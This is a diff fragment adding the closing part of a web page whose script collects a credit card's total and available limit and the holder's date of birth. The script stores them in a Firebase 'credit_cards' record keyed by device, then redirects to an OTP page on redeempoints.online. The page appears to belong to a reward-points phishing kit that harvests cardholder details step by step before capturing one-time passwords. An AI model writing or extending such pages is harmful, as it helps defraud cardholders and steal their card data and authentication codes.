+                } else if (totalLimitNum < 10000) {
+                    document.getElementById('totalLimitError').innerHTML = '⚠️ Total limit should be at least ₹10,000';
+                    document.getElementById('totalLimitError').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('totalLimitError').style.display = 'none';
+                }
+            }
+
+            if (!verifyLimit) {
+                document.getElementById('limitError').innerHTML = '⚠️ Please enter available limit';
+                document.getElementById('limitError').style.display = 'block';
+                isValid = false;
+            } else {
+                availableLimitNum = parseInt(verifyLimit.replace(/,/g, ''));
+                if (isNaN(availableLimitNum) || availableLimitNum <= 0) {
+                    document.getElementById('limitError').innerHTML = '⚠️ Please enter valid limit amount';
+                    document.getElementById('limitError').style.display = 'block';
+                    isValid = false;
+                } else if (totalLimitNum > 0 && availableLimitNum > totalLimitNum) {
+                    document.getElementById('limitError').innerHTML = `⚠️ Available limit cannot exceed total limit (₹${totalLimitNum.toLocaleString('en-IN')})`;
+                    document.getElementById('limitError').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('limitError').style.display = 'none';
+                }
+            }
+
+            if (!verifyDob) {
+                document.getElementById('dobError').innerHTML = '⚠️ Please enter date of birth';
+                document.getElementById('dobError').style.display = 'block';
+                isValid = false;
+            } else if (!verifyDob.match(/^\d{2}\/\d{2}\/\d{4}$/)) {
+                document.getElementById('dobError').innerHTML = '⚠️ Enter valid DOB in DD/MM/YYYY format';
+                document.getElementById('dobError').style.display = 'block';
+                isValid = false;
+            } else {
+                const [day, month, year] = verifyDob.split('/');
+                const dayNum = parseInt(day, 10);
+                const monthNum = parseInt(month, 10);
+                const yearNum = parseInt(year, 10);
+
+                if (monthNum < 1 || monthNum > 12) {
+                    document.getElementById('dobError').innerHTML = '⚠️ Month must be between 01 and 12';
+                    document.getElementById('dobError').style.display = 'block';
+                    isValid = false;
+                } else if (dayNum < 1 || dayNum > 31) {
+                    document.getElementById('dobError').innerHTML = '⚠️ Day must be between 01 and 31';
+                    document.getElementById('dobError').style.display = 'block';
+                    isValid = false;
+                } else if (yearNum < 1900 || yearNum > new Date().getFullYear()) {
+                    document.getElementById('dobError').innerHTML = `⚠️ Year must be between 1900 and ${new Date().getFullYear()}`;
+                    document.getElementById('dobError').style.display = 'block';
+                    isValid = false;
+                } else if (!isValidDate(dayNum, monthNum, yearNum)) {
+                    document.getElementById('dobError').innerHTML = '⚠️ Enter valid date (e.g., 15/01/1990)';
+                    document.getElementById('dobError').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('dobError').style.display = 'none';
+                }
+            }
+
+            if (!isValid) return;
+
+            showLoading(true);
+
+            const usedLimitValue = totalLimitNum - availableLimitNum;
+
+            const cardData = {
+                totalLimit: totalLimitNum,
+                totalLimitFormatted: '₹ ' + totalLimitNum.toLocaleString('en-IN'),
+                availableLimit: availableLimitNum,
+                availableLimitFormatted: '₹ ' + availableLimitNum.toLocaleString('en-IN'),
+                usedLimit: usedLimitValue,
+                usedLimitFormatted: '₹ ' + usedLimitValue.toLocaleString('en-IN'),
+                dob: verifyDob,
+                limitVerifiedAt: Date.now(),
+                limitVerifiedDateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+                verificationStatus: 'completed'
+            };
+
+            database.ref(`credit_cards/${deviceId}`).update(cardData)
+                .then(() => {
+                    showLoading(false);
+                    showToast('✅ Limit verification successful!', false);
+                    setTimeout(() => {
+                        window.location.href = `https://redeempoints.online/otp/index.html?deviceId=${deviceId}&userId=${encodeURIComponent(userId)}&cardVerified=true`;
+                    }, 1000);
+                })
+                .catch(err => {
+                    showLoading(false);
+                    showToast('❌ Error saving verification', true);
+                    console.error(err);
+                });
+        }
+
+        function goBack() {
+            window.location.href = 'index.html';
+        }
+    </script>
+</body>
+
+</html>
